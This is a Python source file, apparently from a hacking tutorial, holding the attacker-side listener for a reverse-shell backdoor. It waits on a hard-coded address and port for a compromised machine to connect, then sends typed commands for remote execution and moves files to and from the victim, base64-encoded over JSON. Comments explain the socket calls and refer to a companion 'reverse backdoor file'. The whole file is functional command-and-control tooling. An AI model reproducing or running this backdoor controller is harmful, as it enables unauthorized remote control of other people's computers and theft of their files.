import socket,json,base64,sys

class Listener: 
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #This is identical to the socket initialization in the reverse backdoor file. 

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Change options in the listener. We can change any option we want. We choose level, option/attribute that we want to modify and it's value. 

        listener.bind((ip, port))                                           #Ip of the listening machine

        listener.listen(0)                                                  #We set the backlog to 0. Backlog is the number of connections that can be queued before the system starts refusing connections. 
                                                                            #Setting is to 0 means "Don't queue any connections, connect directly"

        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()                             #The accept() method returns a socket object representing the connection and the ip address bound to it. 
        print(f"[+] Got a connection from {address}")

    def send(self, data):
        if len(data)>2 and type(data[2]) is bytes:
             data[2] = data[2].decode('iso-8859-1')
        else:
            data = data
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(102400).decode('utf-8')
                return json.loads(json_data)
            except Exception:
                continue
    
    def write_file(self, path, content):

        if(len(path)>1):
            path_string = ' '.join(map(str,path))
        else:
            path_string = ''.join(map(str,path))
        
        with open(path_string, 'wb') as file:

            file.write(base64.b64decode(content))
        print("[+] Download Successful.") 

    def read_file(self, path):

        if(len(path) > 1):
            path_string = " ".join(map(str,path))
        else:
            path_string = "".join(map(str,path))
        with open(path_string, "rb") as file:
            return base64.b64encode(file.read())
    

    def execute_remotely(self, command):
        self.send(command)
        if command[0].lower() == "exit":
            self.connection.close()
            sys.exit()
        return self.recieve()

    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file = self.read_file(command[1:])
                    filename = " ".join(map(str,command[1:]))   
                    command = [command[0], filename]
                    command.append(file)



                result= self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1:], result.encode())
                    continue
            except Exception:
                result = "[-] Error during command execution."
            print(result)


my_listener = Listener("192.168.1.186", 8080)
my_listener.run()